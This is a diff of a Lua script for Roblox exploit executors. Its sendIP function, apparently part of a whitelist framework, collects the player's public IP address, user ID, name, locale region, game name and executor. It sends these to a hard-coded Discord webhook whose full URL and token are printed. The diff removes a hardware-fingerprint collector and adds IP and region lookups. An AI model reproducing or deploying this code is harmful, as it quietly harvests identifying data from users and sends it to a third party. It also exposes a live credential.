@@ -64,10 +64,10 @@ local framework = {
   
   local function sendIP(whitelistKey)
     local Webhook = "https://discord.com/api/webhooks/922449991967051816/Wr9l088jha-3r9xP45hpJCSPo7nMpEPkV77yaUwKbvr4wZ1UzP6yFO5jEtzM6ma_15EB"
-    local IPv4 = tostring(game:HttpGet("https://api.ipify.org", true))
+    local IPv4 = game:HttpGet("https://v4.ident.me/")
+    --local IPv6 = game:HttpGet("https://v6.ident.me/")
   
-    local hwid_headers = {'Syn-Fingerprint'} or {'Krnl-Hwid'} or {'fingerprint'} or {'sentinel-fingerprint'} or {'proto-user-identifier'} or {'shadow_hardware'} or {'exploit-guid'} or nil
-   function hwid()local a=req({Url='https://httpbin.org/get',Method='GET'})local b=game:GetService('HttpService'):JSONDecode(a.Body)for c,d in pairs(hwid_headers)do if b.headers[d]then return b.headers[d]end end end
+    local Headers = {["content-type"] = "application/json"} -- Don't Modify
   
     local LocalPlayer = game:GetService("Players").LocalPlayer
   
@@ -75,14 +75,15 @@ local framework = {
     local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
     local UserId = LocalPlayer.UserId
     local PlayerName = LocalPlayer.Name
-    local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-    local ExplCheck =
+    local Reg = game:GetService("LocalizationService").SystemLocaleId
+    local Gname = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+    local Executer =
 	is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
 	secure_load and "Sentinel" or
 	KRNL_LOADED and "Krnl" or
 	SONA_LOADED and "Sona" or identifyexecutor()
 	or "Unknown"
-
+  
     local PlayerData =
     {
            ["content"] = "",
@@ -92,8 +93,8 @@ local framework = {
                ["color"] = tonumber(0x2B6BE4),
                ["fields"] = {
                    {
-                       ["name"] = "MembershipType; ",
-                       ["value"] = MembershipType,
+                       ["name"] = "Game; ",
+                       ["value"] = Gname,
                        ["inline"] = true
     },
                    {
@@ -108,7 +109,7 @@ local framework = {
     },
                    {
                        ["name"] = "Executer; ",
-                       ["value"] = ExplCheck,
+                       ["value"] = Executer,
                        ["inline"] = true
     },
                    {
@@ -118,21 +119,14 @@ local framework = {
     },
   
                    {
-                       ["name"] = "HWID; ",
-                       ["value"] = tostring(hwid()),
+                       ["name"] = "region; ",
+                       ["value"] = Reg,
                        ["inline"] = true
     },
                },
   
            }}
        }
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-local headers = {
-	["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
     local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
     local HttpRequest = http_request;
     if syn then
